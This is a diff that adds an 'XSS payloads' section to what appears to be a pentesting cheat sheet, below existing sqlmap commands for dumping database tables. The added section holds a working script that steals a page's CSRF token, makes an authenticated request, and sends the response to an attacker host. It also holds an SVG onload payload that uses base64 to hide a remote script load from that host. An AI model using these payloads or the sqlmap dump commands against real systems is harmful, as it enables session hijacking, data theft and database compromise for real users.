@@ -1791,7 +1791,34 @@ sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&param
 #enumerate data
 sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> -T <table_name> --dump
 
+##############################
+#### JS / XSS Payloads #######
+##############################
 
+#### GET CSRF TOKEN, Exfil Data #####
+var xhr1 = new XMLHttpRequest();
+xhr1.onload = function(e) {
+  var csrfEl = xhr1.response.getElementById("CSRFToken");
+  var csrfVal = csrfEl.attributes.getNamedItem("value").value;
+  console.log(csrfVal);
+  var xhr2 = new XMLHttpRequest();
+  xhr2.onload = function(f) {
+    var data = xhr2.responseText;
+    console.log(data);
+    var xhr3 = new XMLHttpRequest();
+    xhr3.open("POST", "https://attacker.evil/stolen_data");
+    xhr3.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr3.send(data);
+  }
+  xhr2.open("POST", "https://<target>");
+  xhr2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+  xhr2.send('CSRFToken='+csrfVal);
+}
+xhr1.open("GET", "https://<target>");
+xhr1.responseType = "document";
+xhr1.send();
+#######################################
+<svg onload=document.write(atob('PHNjcmlwdCBzcmM9aHR0cHM6Ly9hdHRhY2tlci5ldmlsL3N0b2xlbi5qcz48L3NjcmlwdD4='))>
 
 
 ##############################
